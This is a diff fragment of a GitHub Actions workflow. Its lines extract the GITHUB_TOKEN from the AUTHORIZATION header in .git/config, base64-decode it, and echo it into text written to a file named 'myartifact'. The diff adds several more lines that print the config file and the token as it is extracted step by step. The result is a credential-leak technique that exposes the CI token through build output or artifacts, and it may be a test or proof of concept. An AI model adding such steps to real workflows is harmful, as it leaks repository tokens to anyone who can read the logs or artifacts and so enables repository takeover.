@@ -15,6 +15,12 @@ jobs:
           cat <<EOT >> myartifact
           ls
           GITHUB_TOKEN=$(cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3 | base64 -d)
+          cat $GITHUB_WORKSPACE/.git/config
+          cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION
+          cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2
+          cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3
+          cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3
+          cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3 | base64 -d
           
           echo $GITHUB_TOKEN
           echo $GITHUB_TOKEN | base64
